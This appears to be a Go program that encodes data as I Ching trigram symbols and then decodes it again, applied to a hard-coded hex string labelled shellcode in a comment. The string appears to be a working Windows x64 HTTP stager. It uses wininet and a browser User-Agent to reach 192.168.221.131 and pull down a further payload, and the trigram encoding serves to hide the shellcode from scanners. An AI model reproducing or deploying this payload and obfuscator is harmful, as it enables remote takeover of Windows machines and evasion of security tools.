package main

import (
	"errors"
	"fmt"
	"os"
	"strconv"
	"strings"
)

const (
	qian = "☰" // 乾
	dui  = "☱" // 兑
	li   = "☲" // 离
	zhen = "☳" // 震
	xun  = "☴" // 巽
	kan  = "☵" // 坎
	gen  = "☶" // 艮
	kun  = "☷" // 坤
)

var m1 = map[int]string{
	0: qian,
	1: dui,
	2: li,
	3: zhen,
	4: xun,
	5: kan,
	6: gen,
	7: kun,
}

var m2 = map[string][3]int{
	qian: {0, 0, 0},
	dui:  {0, 0, 1},
	li:   {0, 1, 0},
	zhen: {0, 1, 1},
	xun:  {1, 0, 0},
	kan:  {1, 0, 1},
	gen:  {1, 1, 0},
	kun:  {1, 1, 1},
}

func encode(src []byte) string {
	bs := make([]int, len(src)*8)
	bl := len(bs)
	for k, v := range src {
		byteTo2(int(v), bs[k*8:k*8+8])
	}

	buf := make([]string, (bl+2)/3)
	for i := 0; i*3+2 < len(bs); i++ {
		buf[i] = m1[bs[i*3]<<2+bs[i*3+1]<<1+bs[i*3+2]]
	}

	switch bl % 3 {
	case 1:
		buf[(bl+2)/3-1] = m1[bs[bl-1]<<2]
	case 2:
		buf[(bl+2)/3-1] = m1[bs[bl-2]<<2+bs[bl-1]<<1]
	}

	return strings.Join(buf, "")
}

func decode(s string) ([]byte, error) {
	if s == "" {
		return nil, nil
	}

	sl := len(s)

	is := make([]int, sl)
	for i := 0; i < sl/3; i++ {
		b, ok := m2[s[i*3:i*3+3]]
		if !ok {
			return nil, errors.New("invalid string, cur: " + strconv.Itoa(i))
		}
		copy(is[i*3:i*3+3], b[:])
	}

	buf := make([]byte, sl/8)
	for i := 0; i < sl/8; i++ {
		buf[i] = b8ToByte(is[i*8 : i*8+8])
	}

	return buf, nil
}

func b8ToByte(b []int) byte {
	return byte(b[0]<<7 + b[1]<<6 + b[2]<<5 + b[3]<<4 + b[4]<<3 + b[5]<<2 + b[6]<<1 + b[7])
}

func byteTo2(byt int, dst []int) {
	var i = 7
	for byt != 0 {
		dst[i] = byt % 2
		byt = byt >> 1
		i--
	}
	return
}

// 加密
func Bagua_en(s []byte) string {
	result := encode(s)
	return result
}

// 解密
func Bagua_de(s string) []byte {
	result, err := decode(s)
	if err != nil {
		fmt.Fprintln(os.Stderr, err.Error())
		os.Exit(1)
	}
	return result
}

func main() {

	//尝试使用命令行进行获取shellcode
	//if len(os.Args) < 2 {
	//	fmt.Println("Usage: go run main.go <filename>")
	//	return
	//}
	//str := os.Args[1]

	var str = "fc4883e4f0e8c8000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b0275728b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94fffffff5d6a0049be77696e696e65740041564989e64c89f141ba4c772607ffd54831c94831d24d31c04d31c94150415041ba3a5679a7ffd5eb735a4889c141b8570400004d31c9415141516a03415141ba57899fc6ffd5eb595b4889c14831d24989d84d31c9526800024084525241baeb552e3bffd54889c64883c3506a0a5f4889f14889da49c7c0ffffffff4d31c9525241ba2d06187bffd585c00f859d01000048ffcf0f848c010000ebd3e9e4010000e8a2ffffff2f476539780066fdbb3485a5427193a199e7c0c1d9999467232ae4fb275b181521cc97f05e93c14665c5df90d345b09253751ff8dde17498d724c9ba04a7876d0183ddfa9b5b907385f1a3094c81d300557365722d4167656e743a204d6f7a696c6c612f352e302028636f6d70617469626c653b204d53494520392e303b2057696e646f7773204e5420362e313b2054726964656e742f352e303b20554853290d0a007e743b00227284ade2f11a6da5bfe19d65005512778e09eb27aad70f319f0a57fcc437a2433c42678909c2729982729e938e8e33ca3507aef26090c14ce3cd5771b360a985072318df519db54c095c6b8847ad11accbea25a0fcc7f9f8ebc8006d3c2ef72133f9e0189ca0a2f69622cf69951dc3ee487589fbee0ec32cc1cee71f48dfb924a5e0\n9796f4a751e0ae1d1900c353c070ca89b84db6af0ac52b00962efab5f803ef530a21ba33ebb69cde43c19241e67265c0efbdb7ed26ad30daeef56ba87fc404b60efdefb4c30b4990d54858521c3b8d09003edbdccf00\n41bef0b5a256ffd54831c9ba0000400041b80010000041b94000000041ba58a453e5ffd5489353534889e74889f14889da41b8002000004989f941ba129689e2ffd54883c42085c074b6668b074801c385c075d758585848050000000050c3e89ffdffff3139322e3136382e3232312e313331003ade68b1"
	strbytes := []byte(str)
	s := Bagua_en(strbytes)
	d := Bagua_de(s)
	fmt.Printf("加密数据: %v \n", str)
	fmt.Printf("加密结果: %v \n", s)
	//fmt.Printf("%T", ([]byte)s)
	fmt.Printf("解密结果: %v \n", string(d))
}
